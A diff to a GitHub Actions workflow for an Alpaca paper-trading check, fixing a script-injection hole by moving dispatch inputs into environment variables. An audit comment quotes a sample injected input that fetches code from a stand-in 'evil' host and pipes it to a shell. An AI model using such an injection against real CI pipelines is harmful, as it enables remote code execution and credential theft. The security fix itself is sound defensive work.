@@ -51,6 +51,18 @@ jobs:
           ALPACA_API_KEY: ${{ secrets.ALPACA_API_KEY }}
           ALPACA_SECRET_KEY: ${{ secrets.ALPACA_SECRET_KEY }}
           ALPACA_BASE_URL: ${{ secrets.ALPACA_BASE_URL }}
+          # Independent audit finding (2026-09-24): `workflow_dispatch`
+          # inputs must never be interpolated directly into a `run:`
+          # block via `${{ }}` -- GitHub expands that BEFORE the shell
+          # ever sees the script, so an input like `AAPL"; curl evil |
+          # sh #` becomes literal shell code, not a quoted string, with
+          # this job's own real Alpaca credentials in scope. Passed as
+          # env vars instead (expanded by the shell as `$VAR`, never by
+          # GitHub's own template engine) -- the same fix already
+          # applied to every other `workflow_dispatch` input across this
+          # repository's workflows in this same pass.
+          SYMBOL_INPUT: ${{ inputs.symbol }}
+          QTY_INPUT: ${{ inputs.qty }}
         run: |
           python3 scripts/verify_alpaca_paper_broker.py \
-            --symbol "${{ inputs.symbol }}" --qty "${{ inputs.qty }}"
+            --symbol "$SYMBOL_INPUT" --qty "$QTY_INPUT"
